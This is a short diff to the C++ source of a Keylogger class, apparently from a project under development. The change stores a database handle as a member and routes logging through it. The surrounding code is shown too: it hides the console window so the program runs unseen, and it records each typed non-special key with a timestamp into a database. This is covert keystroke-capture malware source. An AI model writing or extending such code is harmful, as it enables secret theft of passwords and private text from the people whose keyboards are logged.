@@ -7,9 +7,11 @@
 #include <stdio.h>
 #include <iostream>
 #include <fstream>
+#include <thread>
 
 void Keylogger::start(Database db)
 {
+    m_db = db;
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     char KEY = 'x';
 
@@ -22,7 +24,7 @@ void Keylogger::start(Database db)
                 if (SpecialKeys(KEY) == false)
                 {
                     std::time_t time = std::time(0);
-                    db.insertKey("keyboard", time, KEY);
+                    m_db.insertKey("keyboard", time, KEY);
                 }
             }
         }
